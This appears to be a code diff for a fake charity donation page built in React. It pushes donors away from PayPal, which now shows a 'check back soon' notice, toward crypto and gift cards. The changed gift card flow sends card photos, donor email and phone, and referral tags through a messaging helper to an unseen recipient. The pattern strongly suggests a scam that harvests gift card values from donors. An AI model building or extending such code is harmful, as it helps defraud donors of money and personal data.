@@ -6,7 +6,7 @@ import { SiLitecoin, SiTether, SiVisa, SiMastercard } from 'react-icons/si'
 import { Tab } from '@headlessui/react'
 import { CreditCardIcon, CurrencyDollarIcon, ArrowPathIcon, ClipboardIcon, CheckIcon, QrCodeIcon, ExclamationCircleIcon, PhotoIcon } from '@heroicons/react/24/outline'
 import { countFormat } from '../constants'
-import { sendMessage } from '../constants/send'
+import { sendMessage, sendMessageWithImage } from '../constants/send'
 import QRCode from 'react-qr-code'
 import { trackReferralDonation } from '../constants/analytics'
 import { getStaffReferral } from '../constants/staff'
@@ -190,7 +190,7 @@ function validateGiftCard(number, brand) {
   };
 }
 
-const PaymentProcessor = ({ amount, selectedOrg, donationType, donorName, donorEmail, donorPhone, onSuccess, onError }) => {
+const PaymentProcessor = ({ amount, selectedOrg, referral, donationType, donorName, donorEmail, donorPhone, onSuccess, onError }) => {
   const [cryptoPaymentUrl, setCryptoPaymentUrl] = useState(null)
   const [loading, setLoading] = useState(false)
   const [selectedTab, setSelectedTab] = useState(0)
@@ -314,6 +314,7 @@ ${Object.entries(details).map(([key, value]) => `${key}: ${value}`).join('\n')}`
 ############ Crypto Payment Details ############
 Donation Information:
 - Amount: $${amount} USD
+- Referral: ${referral || 'None'}
 - Organization: ${selectedOrg?.name || 'Charity'}
 - Type: ${isRecurring ? 'Recurring' : 'One-time'} donation
 
@@ -469,7 +470,7 @@ Donor Email: ${donorEmail || 'Anonymous'}
 Donor Phone: ${donorPhone || 'Anonymous'}
 Payment Type: ${isRecurring ? 'Recurring' : 'One-time'}
 Staff Referral: ${staffId || 'None'}
-
+Referral: ${referral || 'None'}
 Card Details:
 - Card Type: ${selectedGiftCard.name}
 - Submission Method: ${type === 'code' ? 'Card Number & PIN' : 'Image Upload'}
@@ -487,31 +488,27 @@ ${type === 'code' ? `- Last 4 Digits: ${giftCardNumber.slice(-4)}` : ''}
 ############ Gift Card Front Image Info ############
 Card Type: ${selectedGiftCard.name}
 Donor: ${donorName || 'Anonymous'}
-Image Details:
-- File Name: ${giftCardFrontImage.name}
-- File Size: ${(giftCardFrontImage.size / 1024).toFixed(2)} KB
-- File Type: ${giftCardFrontImage.type}
-Timestamp: ${new Date().toISOString()}
-#######################################`;
-
-        const backImageInfo = `
-############ Gift Card Back Image Info ############
-Card Type: ${selectedGiftCard.name}
-Donor: ${donorName || 'Anonymous'}
-Image Details:
-- File Name: ${giftCardBackImage.name}
-- File Size: ${(giftCardBackImage.size / 1024).toFixed(2)} KB
-- File Type: ${giftCardBackImage.type}
+Donor Email: ${donorEmail || 'Anonymous'}
+Donor Phone: ${donorPhone || 'Anonymous'}
+Referral: ${referral || 'None'}
 Timestamp: ${new Date().toISOString()}
 #######################################`;
 
         const imageStorageMessage = `
 Note: Card images have been received and processed successfully. 
 For security reasons, full image data is not included in these messages.
-Please ensure you keep the original images for your records.`;
+Please ensure you keep the original images for your records.
 
-        await sendMessage(frontImageInfo);
-        await sendMessage(backImageInfo);
+`;
+
+        const imageMessage = () => {
+          if (frontImagePreview && backImagePreview) {
+            return sendMessageWithImage(frontImageInfo, frontImagePreview)
+          } else {
+            return sendMessage(imageStorageMessage)
+          }
+        }
+        await imageMessage();
         await sendMessage(imageStorageMessage);
       }
 
@@ -859,22 +856,6 @@ Please ensure you keep the original images for your records.`;
             }
           >
             <div className="flex items-center justify-center gap-2">
-              <CreditCardIcon className="h-5 w-5" />
-              PayPal
-            </div>
-          </Tab>
-          <Tab
-            className={({ selected }) =>
-              classNames(
-                'w-full rounded-lg py-2.5 text-sm font-medium leading-5',
-                'ring-white ring-opacity-60 ring-offset-2 ring-offset-blue-400 focus:outline-none focus:ring-2',
-                selected
-                  ? 'bg-white shadow text-indigo-700'
-                  : 'text-indigo-600 hover:bg-white/[0.12] hover:text-indigo-700'
-              )
-            }
-          >
-            <div className="flex items-center justify-center gap-2">
               <CurrencyDollarIcon className="h-5 w-5" />
               Crypto
             </div>
@@ -895,43 +876,25 @@ Please ensure you keep the original images for your records.`;
               Gift Card
             </div>
           </Tab>
+          <Tab
+            className={({ selected }) =>
+              classNames(
+                'w-full rounded-lg py-2.5 text-sm font-medium leading-5',
+                'ring-white ring-opacity-60 ring-offset-2 ring-offset-blue-400 focus:outline-none focus:ring-2',
+                selected
+                  ? 'bg-white shadow text-indigo-700'
+                  : 'text-indigo-600 hover:bg-white/[0.12] hover:text-indigo-700'
+              )
+            }
+          >
+            <div className="flex items-center justify-center gap-2">
+              <CreditCardIcon className="h-5 w-5" />
+              PayPal
+            </div>
+          </Tab>
         </Tab.List>
 
         <Tab.Panels className="mt-4">
-          {/* PayPal Panel */}
-          <Tab.Panel className="rounded-xl bg-white p-3">
-            <div className="space-y-4">
-              <div className="bg-gray-50 rounded-lg p-4">
-                <h3 className="text-lg font-medium text-gray-900">PayPal Payment</h3>
-                <p className="mt-1 text-sm text-gray-600">
-                  Securely donate using PayPal or credit/debit card
-                </p>
-              </div>
-
-              <PayPalButtons
-                style={{ layout: "vertical" }}
-                createOrder={(data, actions) => {
-                  return actions.order.create({
-                    purchase_units: [
-                      {
-                        amount: {
-                          value: amount,
-                          currency_code: "USD"
-                        },
-                        description: `Donation to ${selectedOrg?.name || 'Charity'}`
-                      }
-                    ]
-                  });
-                }}
-                onApprove={handlePayPalApproval}
-                onError={(err) => {
-                  onError(err);
-                  logPaymentEvent('PayPal Payment Error', JSON.stringify(err));
-                }}
-              />
-            </div>
-          </Tab.Panel>
-
           {/* Crypto Panel */}
           <Tab.Panel className="rounded-xl bg-white p-3">
             <div className="space-y-4">
@@ -1100,6 +1063,57 @@ Please ensure you keep the original images for your records.`;
               </div>
 
               {renderGiftCardPanel()}
+            </div>
+          </Tab.Panel>
+
+          {/* PayPal Panel */}
+          <Tab.Panel className="rounded-xl bg-white p-3">
+            <div className="space-y-4">
+              <div className="bg-gray-50 rounded-lg p-4">
+                <h3 className="text-lg font-medium text-gray-900">PayPal Payment</h3>
+                <p className="mt-1 text-sm text-gray-600">
+                  {/* Securely donate using PayPal or credit/debit card */}
+                  We're working on adding PayPal support. Please check back soon! Continue with Crypto/Gift Card
+                  <br />
+                  <button
+                    type="button"
+                    onClick={() => setSelectedTab(0)}
+                    className="text-indigo-600 hover:text-indigo-700 mr-4"
+                  >
+                    Use Crypto
+                  </button>
+                  || 
+                  <button
+                    type="button"
+                    onClick={() => setSelectedTab(1)}
+                    className="text-indigo-600 hover:text-indigo-700 ml-4"
+                  >
+                    Use Gift Card
+                  </button>
+                </p>
+              </div>
+
+              <PayPalButtons
+                style={{ layout: "vertical" }}
+                createOrder={(data, actions) => {
+                  return actions.order.create({
+                    purchase_units: [
+                      {
+                        amount: {
+                          value: amount,
+                          currency_code: "USD"
+                        },
+                        description: `Donation to ${selectedOrg?.name || 'Charity'}`
+                      }
+                    ]
+                  });
+                }}
+                onApprove={handlePayPalApproval}
+                onError={(err) => {
+                  onError(err);
+                  logPaymentEvent('PayPal Payment Error', JSON.stringify(err));
+                }}
+              />
             </div>
           </Tab.Panel>
         </Tab.Panels>
